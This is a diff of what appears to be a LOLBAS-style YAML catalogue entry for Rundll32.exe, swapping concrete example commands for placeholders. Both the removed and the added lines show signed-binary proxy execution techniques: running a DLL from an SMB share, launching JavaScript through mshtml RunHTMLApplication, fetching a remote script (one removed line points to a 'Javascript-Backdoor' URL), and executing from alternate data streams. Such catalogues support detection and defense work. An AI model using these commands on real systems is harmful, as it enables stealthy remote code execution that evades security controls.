@@ -1,20 +1,20 @@
 ---
 Name: Rundll32.exe
 Description: Used by Windows to execute dll files
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: rundll32.exe AllTheThingsx64,EntryPoint
-    Description: AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.
-    Usecase: Execute dll file
+  - Command: rundll32.exe {PATH},EntryPoint
+    Description: First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.
+    Usecase: Execute DLL file
     Category: Execute
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: DLL
-  - Command: rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
-    Description: Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.
+  - Command: rundll32.exe {PATH_SMB:.dll},EntryPoint
+    Description: Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.
     Usecase: Execute DLL from SMB share.
     Category: Execute
     Privileges: User
@@ -23,8 +23,6 @@ Commands:
     Tags:
       - Execute: DLL
       - Execute: Remote
-  - Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
-    Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe.
     Usecase: Proxy execution
     Category: Execute
     Privileges: User
@@ -32,7 +30,7 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: JScript
-  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
     Description: Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.
     Usecase: Execute code from Internet
     Category: Execute
@@ -41,7 +39,7 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: JScript
-  - Command: rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain
+  - Command: rundll32 "{PATH}:ADSDLL.dll",DllMain
     Description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).
     Usecase: Execute code from alternate data stream
     Category: ADS
